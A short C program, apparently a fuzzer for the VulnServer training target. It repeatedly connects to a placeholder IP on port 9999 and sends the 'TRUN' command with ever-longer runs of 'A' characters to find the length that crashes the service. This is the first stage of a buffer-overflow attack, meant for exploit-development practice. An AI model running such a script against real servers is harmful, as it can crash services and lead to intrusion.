#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "utils.h"
#define PORT 9999
#define IP "TARGET MACHINE IP"


/* 

    coder: devtbenoth
    github: https://github.com/devtbenoth
    For VulnServer 

*/
int main() {
    char buff[10000] = "TRUN /.:/";
    char addStr[100] = "AAAAAAA";
    int nm = 100;
    int x = 0;
     while(1) {
        int scket = socket(AF_INET, SOCK_STREAM, 0);
        if (scket == -1) {
            printf("%s\n", strerror(errno));
            return EXIT_FAILURE;
        }
        struct sockaddr_in sock;
            sock.sin_addr.s_addr = inet_addr(IP);
            sock.sin_port = htons(PORT);
            sock.sin_family = AF_INET;
            int cnt = connect(scket, (struct sockaddr*)&sock, sizeof(sock));
            if (cnt == -1) {
                printf("%s\n", strerror(errno));
                return EXIT_FAILURE;
            }
            for(; x < nm; x++) {
                concStr(buff, addStr);
        	printf("Buff Lenght --> %ld\n", strlen(buff));
	    }
            int wr = write(scket, buff, sizeof(buff));
            if (wr == -1) {
                printf("%s\n", strerror(errno));
            }
            nm += 100;
            sleep(1);
     }
}
